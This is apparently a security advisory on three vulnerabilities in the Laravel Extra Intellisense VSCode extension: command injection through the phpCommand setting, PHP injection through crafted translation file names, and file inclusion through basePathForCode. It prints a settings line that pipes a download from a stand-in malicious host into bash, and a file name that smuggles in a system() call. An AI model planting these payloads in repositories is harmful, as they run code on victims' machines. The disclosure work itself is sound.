# Vulnerabilities in Laravel Extra Intellisense VSCode Extension

## 1. Remote Code Execution via phpCommand Configuration

### Description
The VSCode extension allows users to customize how PHP code is executed through the `LaravelExtraIntellisense.phpCommand` configuration setting. This setting can be exploited by an attacker who creates a malicious repository with a custom `.vscode/settings.json` file that injects arbitrary commands. When a victim opens this repository in VSCode with this extension installed, the malicious commands will execute on their system.

Steps to trigger the vulnerability:
1. An attacker creates a malicious repository with a Laravel-like structure
2. The repository includes a `.vscode/settings.json` file with a malicious command in the `LaravelExtraIntellisense.phpCommand` setting
3. When a victim opens this repository in VSCode with the extension installed, the malicious command is executed

The vulnerability exists in the `Helpers.runPhp()` method in `helpers.ts`, which directly uses the user-configured phpCommand setting to execute commands without adequate validation or sandboxing.

### Impact
Remote code execution on the victim's machine with the same privileges as the VSCode process. The attacker can execute arbitrary commands, access sensitive files, install malware, or pivot to other systems on the network. Since the command executes immediately when a Laravel project is opened, the victim doesn't need to perform any special action other than opening the project.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The code attempts basic escaping of quotes and dollar signs in the PHP code before insertion, but does not validate or sanitize the phpCommand template itself. There is a general security warning in the README, but it doesn't specifically mention the risk of opening unknown repositories.

### Missing Mitigations
1. Whitelist validation for the phpCommand template
2. Sandbox execution of PHP code
3. Warning to users when a non-default phpCommand is detected in workspace settings
4. Shell command injection protection should be implemented
5. Documentation should be updated to warn users about the risks of opening untrusted repositories

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed in VSCode
2. Victim must open a repository containing a malicious `.vscode/settings.json` file
3. The extension must be enabled for the workspace
4. The malicious project must contain a basic Laravel structure (at least an `artisan` file)

### Source Code Analysis
In `helpers.ts`, the vulnerable code starts at the `runPhp` method:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Command execution happens here
    cp.exec(command, { ... });
}
```

The critical issue is that `commandTemplate` is obtained directly from workspace settings and can be controlled by an attacker. Even though the code parameter is somewhat escaped, the commandTemplate itself can contain arbitrary shell commands.

For example, a attacker could create a repository with a `.vscode/settings.json` containing:
```json
{
  "LaravelExtraIntellisense.phpCommand": "curl https://malicious.com/payload | bash; php -r \"{code}\""
}
```

When the extension runs, it will execute the malicious curl command before running the actual PHP code.

In `extension.ts`, when the extension activates, it checks if an "artisan" file exists, indicating a Laravel project. If found, it initializes various providers like RouteProvider, ViewProvider, etc. These providers use `Helpers.runLaravel()` which in turn calls `Helpers.runPhp()`.

### Security Test Case
1. Create a test repository with a Laravel project structure
2. Add a `.vscode/settings.json` file with the following content:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "echo 'RCE_VULNERABILITY_CONFIRMED' > /tmp/rce_proof; php -r \"{code}\""
   }
   ```
3. Open the repository in VSCode with the Laravel Extra Intellisense extension installed
4. Verify that a file `/tmp/rce_proof` is created containing "RCE_VULNERABILITY_CONFIRMED"
5. This confirms the ability to execute arbitrary commands through the phpCommand setting

## 2. PHP Code Injection via Extension Features

### Description
The extension generates and executes PHP code to interact with the Laravel application. The code generation in the `runLaravel()` method directly incorporates user-controlled input into PHP code that is later executed, creating a code injection vulnerability. An attacker can craft a malicious Laravel project with specially crafted views, routes, or other components that will trigger the injection when the extension processes them.

### Impact
Remote code execution within the PHP context. The attacker can execute arbitrary PHP code with the same privileges as the PHP process, potentially allowing access to sensitive data, further system compromise, or spreading to connected systems.

### Vulnerability Rank
High

### Currently Implemented Mitigations
Some basic sanitization is performed, but it's insufficient against sophisticated attacks.

### Missing Mitigations
1. Use of parameterized PHP execution instead of string concatenation
2. Strict validation of all inputs before inclusion in PHP code
3. Execution in a limited PHP sandbox with reduced privileges

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed
2. Victim must open a repository with malicious PHP code in Laravel components

### Source Code Analysis
In `helpers.ts`, the vulnerable code is in the `runLaravel` method:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // More PHP code here
            code +
            // More PHP code here
            "$kernel->terminate($input, $status);" +
            "exit($status);";

        // This PHP code is then executed
        self.runPhp(command, description)
    }
}
```

The `code` parameter is directly embedded into a larger PHP script without proper validation. Various provider classes (RouteProvider, ViewProvider, etc.) pass different PHP code to this method. Some of this code contains data extracted from the Laravel project, which could be manipulated by an attacker.

For example, in `TranslationProvider.ts`, PHP code is generated based on translation groups found in the project:
```typescript
Helpers.runLaravel("echo json_encode([" + translationGroups.map((transGroup: string) => "'" + transGroup + "' => __('" + transGroup + "')").join(",") + "]);", "Translations inside namespaces")
```

If an attacker can create a file with a specially crafted name or content in the translations directory, they could potentially inject PHP code.

### Security Test Case
1. Create a test repository with a Laravel project structure
2. Create a malicious translation file with a specially crafted name, such as `resources/lang/en/test');system('echo PHP_CODE_INJECTION > /tmp/injection_proof').php`
3. Open the repository in VSCode with the Laravel Extra Intellisense extension enabled
4. Check if the file `/tmp/injection_proof` is created containing "PHP_CODE_INJECTION"
5. This confirms the ability to inject PHP code through malicious Laravel project files

## 3. Path Traversal via basePath and basePathForCode Configuration

### Description
The extension allows configuration of custom base paths for the Laravel project via `LaravelExtraIntellisense.basePath` and `LaravelExtraIntellisense.basePathForCode`. These paths are used to construct file paths that are directly included in PHP code without sufficient validation. If an attacker can manipulate these settings, they can potentially cause the extension to execute code from arbitrary locations.

Steps to trigger the vulnerability:
1. An attacker creates a malicious repository with a `.vscode/settings.json` file containing crafted basePathForCode setting
2. When a victim opens this repository, the extension uses these paths to include PHP files
3. This can lead to inclusion of malicious PHP files or loading of sensitive files from the victim's system

### Impact
Code execution on the victim's system with the same privileges as the PHP process, allowing potential data theft, system compromise, or lateral movement within the network. An attacker could cause the extension to include malicious PHP files from arbitrary locations on the filesystem.

### Vulnerability Rank
High

### Currently Implemented Mitigations
Limited path cleaning is performed, but it's insufficient against sophisticated attacks. The code does check if required Laravel files exist before proceeding, but there's no validation of the path content itself.

### Missing Mitigations
1. Strict validation of path inputs
2. Path canonicalization before use
3. Restriction to project directory
4. The extension should validate that the base paths don't contain dangerous path traversal sequences
5. A warning should be displayed when custom base paths are specified in workspace settings

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed
2. Victim must open a repository with malicious configuration
3. PHP must be installed on the victim's machine

### Source Code Analysis
In `helpers.ts`, the vulnerable code is in the `projectPath` method, which is then used in `runLaravel`:

```typescript
static projectPath(path:string, forCode: boolean = false) : string {
    if (path[0] !== '/') {
        path = '/' + path;
    }

    let basePathForCode = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePathForCode');
    if (forCode && basePathForCode && basePathForCode.length > 0) {
        if (basePathForCode.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
            basePathForCode = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePathForCode);
        }
        basePathForCode = basePathForCode.replace(/[\/\\]$/, "");
        return basePathForCode + path;
    }
    // ...
}
```

In `runLaravel`, this path is used in PHP code:
```typescript
"require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
"$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';"
```

An attacker could set `basePathForCode` to a value that would cause PHP to include a malicious file. This path is then used directly in PHP code construction without sufficient validation or sanitization.

### Security Test Case
1. Create a basic Laravel-like structure with an `artisan` file
2. Create a malicious PHP file outside the project directory (e.g., `/tmp/malicious.php`) containing:
   ```php
   <?php
   file_put_contents('/tmp/path_traversal.txt', 'VULNERABLE');
   ?>
   ```
3. Create a fake `vendor/autoload.php` and `bootstrap/app.php` in this external location
4. Add a `.vscode/settings.json` file with:
   ```json
   {
     "LaravelExtraIntellisense.basePathForCode": "/tmp/malicious_project"
   }
   ```
5. Open the project in VSCode with the extension installed
6. Verify that `/tmp/path_traversal.txt` is created, confirming the vulnerability
